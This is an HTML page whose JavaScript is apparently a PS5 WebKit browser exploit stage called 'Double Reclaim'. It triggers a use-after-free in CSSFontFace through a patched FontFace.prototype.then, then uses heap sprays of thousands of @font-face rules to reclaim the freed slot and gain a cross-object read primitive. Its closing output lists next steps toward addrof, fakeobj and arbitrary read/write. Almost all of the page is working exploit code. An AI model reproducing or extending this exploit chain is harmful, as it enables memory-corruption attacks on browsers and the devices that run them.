<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v34 - Double Reclaim</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v34 DBL-REC</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v34 — Double Reclaim Outbound Read
//
//  STRATEGY:
//  1. UAF frees "x" CSSFontFace
//  2. Spray A_0..A_2047 → one reclaims "x" slot (e.g. A_61)
//  3. Read "x" → confirms A_61 (cross-object read)
//  4. Delete A_61's CSSRule → frees A_61 from "A_61" bucket
//     BUT "x" bucket still points to A_61's memory!
//  5. GC pressure → finalize A_61 free
//  6. Spray B_0..B_2047 with DIFFERENT properties
//  7. One B_NNN reclaims A_61's freed memory
//  8. Read "x" → should now return B_NNN's properties!
//  9. If B_NNN properties differ from A_61 = OUTBOUND READ!
//
//  KEY INSIGHT from source code:
//  removeFromFacesLookupTable searches by face.families()
//  A_61's family = "A_61", NOT "x"
//  So deleting A_61 removes it from "A_61" bucket
//  But "x" bucket retains dangling Ref<CSSFontFace>!
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,60)+" @"+l);return true};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v34 — Double Reclaim","hd");
P("  Outbound Memory Read","hd");
P("════════════════════════════════════","hd");
P("");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[];
var holes=[];
var trigger=null;
var uafOk=false;

// ============================================================
//  PHASE 1: Setup + UAF
// ============================================================
pg(5);Hd("Creating holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready");

pg(10);Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

pg(15);Hd("UAF + First Spray (A_0..A_2047)");

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
St("UAF WINDOW OPEN");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}

Dm("GC pressure...");
for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}

// FIRST SPRAY: A_0 to A_2047
Dm("Spraying 2048 A_ faces...");
for(var i=0;i<2048;i++){
  try{
    sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length);
  }catch(e){}
}
fs();

try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
Dm("UAF window closing");
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){
  try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}
}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
//  PHASE 2: Identify First Reclaim (A_NNN)
// ============================================================
pg(30);Sep();Hd("PHASE 2: Identify First Reclaim");Sep();

document.fonts.load("1em trigger, x","AB").then(function(faces){
  var aFamily=null;
  for(var i=0;i<faces.length;i++){
    var f=faces[i];
    if(f.family&&f.family.indexOf("A_")===0){
      aFamily=f.family;
      St("FIRST RECLAIM: "+aFamily);
      Hi("  weight="+f.weight+" style="+f.style);
      break;
    }
  }

  if(!aFamily){
    Fl("No first reclaim detected");
    return;
  }

  keep.push(faces);

  // Find CSSRule for A_NNN
  var aRuleIdx=-1;
  var rules=sh.cssRules;
  for(var i=0;i<rules.length;i++){
    try{
      if(rules[i].type===5&&rules[i].style.fontFamily===aFamily){
        aRuleIdx=i;break;
      }
    }catch(e){}
  }

  if(aRuleIdx===-1){
    Fl("Could not find CSSRule for "+aFamily);
    return;
  }

  Ok("Found CSSRule for "+aFamily+" at index "+aRuleIdx);
  phase3(aFamily,aRuleIdx);

}).catch(function(e){Fl("Load failed: "+e.message)});

// ============================================================
//  PHASE 3: Delete A_NNN + Second Spray (B_0..B_2047)
// ============================================================
function phase3(aFamily,aRuleIdx){
  pg(50);Sep();Hd("PHASE 3: Delete + Second Spray");Sep();

  P("  Deleting CSSRule for "+aFamily+"...","dm");
  P("  This frees A_NNN from 'A_NNN' bucket","dm");
  P("  But 'x' bucket retains dangling pointer!","hl");
  P("");

  // Delete A_NNN's CSSRule
  try{
    sh.deleteRule(aRuleIdx);
    fs();
    Ok("Deleted "+aFamily+" CSSRule");
  }catch(e){
    Fl("Delete failed: "+e.message);
    return;
  }

  // GC pressure to finalize free
  Dm("GC pressure to finalize free...");
  for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}

  // SECOND SPRAY: B_0 to B_2047 with DIFFERENT properties
  P("");
  P("  Spraying 2048 B_ faces with different properties...","dm");
  P("  B_ faces use: weight=900, style=oblique, src=local(Helvetica)","hl");
  P("");

  for(var i=0;i<2048;i++){
    try{
      sh.insertRule("@font-face{font-family:B_"+i+";src:local(Helvetica);font-weight:900;font-style:oblique;unicode-range:U+0042}",sh.cssRules.length);
    }catch(e){}
  }
  fs();
  Ok("2048 B_ faces sprayed");

  // More GC pressure
  for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}

  phase4(aFamily);
}

// ============================================================
//  PHASE 4: Read "x" After Double Reclaim
// ============================================================
function phase4(aFamily){
  pg(70);Sep();Hd("PHASE 4: Read After Double Reclaim");Sep();

  P("  Reading 'x' after double reclaim...","dm");
  P("  If B_NNN reclaimed A_NNN's slot:","dm");
  P("  - family should be B_NNN (not A_NNN)","hl");
  P("  - weight should be 900 (not A_NNN's weight)","hl");
  P("  - style should be oblique (not A_NNN's style)","hl");
  P("");

  document.fonts.load("1em trigger, x","AB").then(function(faces){
    P("  load() returned "+faces.length+" faces","hl");

    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("");
      P("  Face["+i+"]:", "hl");

      var props=["family","style","weight","stretch","unicodeRange",
                 "featureSettings","display","status"];
      for(var pi=0;pi<props.length;pi++){
        try{
          P("    "+props[pi].padEnd(16)+"= "+f[props[pi]]);
        }catch(e){
          P("    "+props[pi].padEnd(16)+"= ERR","er");
        }
      }

      // Check if it's a B_ face
      if(f.family&&f.family.indexOf("B_")===0){
        St("SECOND RECLAIM CONFIRMED: "+f.family);
        Hi("  OUTBOUND READ SUCCESSFUL!");
        Hi("  We read B_NNN's properties through 'x'!");
        Hi("  B_NNN was NOT created by us through 'x'!");
        Hi("  This is a TRUE outbound read!");
      }
      // Check if it's still A_NNN (not reclaimed)
      else if(f.family===aFamily){
        Wr("Still reading "+aFamily+" (not reclaimed by B_)");
        P("  A_NNN's memory was not freed/reclaimed","dm");
      }
      // Check if it's something else entirely
      else if(f.family&&f.family!=="trigger"&&f.family!=="x"){
        St("UNEXPECTED FAMILY: "+f.family);
        Hi("  This might be freed/corrupted memory!");
      }
    }

    keep.push(faces);
    phase5(faces);

  }).catch(function(e){
    Fl("Load after double reclaim: "+e.message);
    Hi("CRASH/ERROR = memory was freed and accessed!");
    phase5(null);
  });
}

// ============================================================
//  PHASE 5: Multiple Reads for Consistency
// ============================================================
function phase5(firstFaces){
  pg(85);Sep();Hd("PHASE 5: Consistency Check");Sep();

  P("  Running 5 consecutive reads to check stability...","dm");
  P("");

  var results=[];
  var readsDone=0;
  var totalReads=5;

  function doRead(){
    if(readsDone>=totalReads){
      phase6(results);
      return;
    }

    document.fonts.load("1em trigger, x","AB").then(function(faces){
      var fam=null;
      for(var i=0;i<faces.length;i++){
        if(faces[i].family&&faces[i].family!=="trigger"){
          fam=faces[i].family;
          break;
        }
      }
      results.push(fam);
      P("  Read "+(readsDone+1)+": family="+fam);
      readsDone++;
      setTimeout(doRead,100);
    }).catch(function(e){
      results.push("ERR:"+e.message.substring(0,20));
      readsDone++;
      setTimeout(doRead,100);
    });
  }

  doRead();
}

// ============================================================
//  PHASE 6: Summary
// ============================================================
function phase6(results){
  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
  P("");
  P("  UAF:                    ✅");
  P("  First reclaim (A_NNN):  ✅");
  P("  Delete A_NNN:           ✅");
  P("  Second spray (B_NNN):   ✅");
  P("  Read after double:      See results above");
  P("  Consistency:            "+results.join(", "));
  P("");

  var hasB=results.some(function(r){return r&&r.indexOf("B_")===0});
  var hasA=results.some(function(r){return r&&r.indexOf("A_")===0});
  var hasErr=results.some(function(r){return r&&r.indexOf("ERR")===0});
  var hasNull=results.some(function(r){return !r||r==="null"||r==="undefined"});

  if(hasB){
    St("★ DOUBLE RECLAIM OUTBOUND READ ★");
    P("  B_NNN reclaimed A_NNN's freed memory!","hl");
    P("  We read B_NNN through 'x' selector!","hl");
    P("  This is a TRUE outbound read primitive!","hl");
    P("");
    P("  Next steps:","hl");
    P("  1. Use this to read m_wrapper offset","hl");
    P("  2. Build addrof from leaked pointer","hl");
    P("  3. Construct fakeobj + arb r/w","hl");
    hu("h2","STAGE:<b>OUTBOUND!</b>");
  }else if(hasErr||hasNull){
    Wr("Errors/Nulls detected = memory may be freed");
    P("  The slot was freed but not reclaimed by B_","dm");
    P("  Need more spray or different timing","dm");
    hu("h2","STAGE:<b>PARTIAL</b>");
  }else if(hasA){
    Wr("Still reading A_NNN = not freed/reclaimed");
    P("  A_NNN's Ref<CSSFontFace> prevented free","dm");
    P("  The 'x' bucket holds a Ref, keeping A_NNN alive","dm");
    hu("h2","STAGE:<b>ALIVE</b>");
  }else{
    P("  Unexpected results","wr");
    hu("h2","STAGE:<b>DONE</b>");
  }
}

</script>
</body>
</html>
